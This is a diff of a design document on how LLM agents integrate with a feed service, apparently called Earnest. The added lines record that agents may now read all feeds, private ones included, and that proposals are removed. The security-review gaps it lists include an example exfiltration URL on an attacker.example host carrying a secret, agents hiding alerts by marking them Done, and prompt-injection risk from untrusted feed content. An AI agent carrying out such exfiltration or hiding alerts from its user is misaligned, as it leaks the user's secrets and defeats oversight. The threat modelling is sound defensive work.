@@ -1,5 +1,7 @@
 # LLM integration
 
+**Decided since.** [decisions.md](decisions.md#agents) overrides parts of this file: agents read every feed, private ones included, with no allowlist, and proposals are gone. The [open gaps](#open-gaps) are decided.
+
 ## Principle
 
 Two directions, in this order:
@@ -148,7 +150,7 @@ Don't promise universal undo. Say which actions can be reverted, which cancelled
 
 ### Open gaps
 
-[The ninth review](raw/r6-security.md) found these, and they aren't closed yet. The first two are exits.
+[The ninth review](raw/r6-security.md) found these. The first two are exits. [All six are now decided](decisions.md#agents).
 
 - **Proposals.** Approving `propose_subscription` fetches a URL the agent chose, so `subscribe("https://attacker.example/?secret=...")` returns behind one click. Proposed tokens and webhooks would carry agent-chosen scopes and destinations. Either a proposal can't carry a URL or destination and you enter it yourself, or approval shows it in full as untrusted. No review screen is specified yet.
 - **Endpoints without a scope.** Agent scopes are defined for the MCP tools; the REST endpoints name none. `/v1/devices` is the worst, since a push endpoint is a destination the server posts to. `/v1/changes`, `/v1/events`, `/v1/opml`, `/v1/export`, `GET /v1/notifications` and `/v1/activity` name no scope or allowlist filter either. Deny agent tokens by default, and keep device registration yours only, like webhooks.
@@ -158,6 +160,8 @@ Don't promise universal undo. Say which actions can be reverted, which cancelled
 - **Hiding, not leaking.** An agent with `state:write-human` can mark an alert Done before you see it. The log records it, but only if you look. Plausible, not confirmed.
 
 ### External agents
+
+[Decided since](decisions.md#agents): agents read every feed, private ones included, so the allowlist below no longer applies.
 
 The hardest case, because Earnest doesn't control the agent. A Claude or Codex session reading your feeds may also hold your email, shell and code. That session has the full trifecta, and Earnest supplies the untrusted content. Earnest can't fix that, but it can reduce the damage:
 
